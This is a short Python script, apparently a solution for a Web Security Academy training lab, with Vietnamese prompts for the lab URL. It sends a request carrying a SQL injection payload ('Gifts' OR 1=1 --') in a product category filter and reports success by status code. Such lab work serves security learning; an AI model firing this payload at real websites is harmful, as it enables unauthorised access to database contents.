import requests
print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")
target_url = f"{url}/filter?category=Gifts'+OR+1=1+--"

response = requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
else:
    print("Failed")